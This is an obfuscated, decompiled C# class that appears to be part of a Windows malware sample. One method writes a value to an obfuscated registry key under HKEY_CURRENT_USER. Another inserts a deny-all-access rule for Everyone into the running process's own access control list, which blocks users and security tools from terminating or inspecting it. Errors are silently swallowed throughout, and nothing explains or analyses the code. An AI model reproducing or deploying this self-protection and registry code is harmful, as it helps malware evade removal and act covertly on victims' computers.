using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace OlVheIVabxHnbNp;

internal sealed class seyPBTDtLpInq
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr YpohtquJJPL, int vLvTwKrdjMsxx, [Out] byte[] TLyXWttYxhSfZl, uint wHxZjntKYaF, out uint ynaXpeuUmH);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr SNSNLLuxdmmYHr, int whOpHQycrZHdCx, [In] byte[] zHdDstjUixCU);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void sTqtrQzqfQQZ(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(QxgtRZDqToQ.MltDPGcncVSc(getString_0(107408041)));
			registryKey.SetValue(QxgtRZDqToQ.MltDPGcncVSc(getString_0(107408448)), getString_0(107408641));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor NGRmaGCddkr(IntPtr intptr_0)
	{
		byte[] tLyXWttYxhSfZl = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, tLyXWttYxhSfZl, 0u, out var ynaXpeuUmH);
		if ((long)ynaXpeuUmH > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, tLyXWttYxhSfZl = new byte[ynaXpeuUmH], ynaXpeuUmH, out ynaXpeuUmH))
		{
			return null;
		}
		return new RawSecurityDescriptor(tLyXWttYxhSfZl, 0);
	}

	private void wpyliPddQZFZ(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void gGtUMDRTyHUj()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = NGRmaGCddkr(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			wpyliPddQZFZ(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static seyPBTDtLpInq()
	{
		Strings.CreateGetStringDelegate(typeof(seyPBTDtLpInq));
	}
}
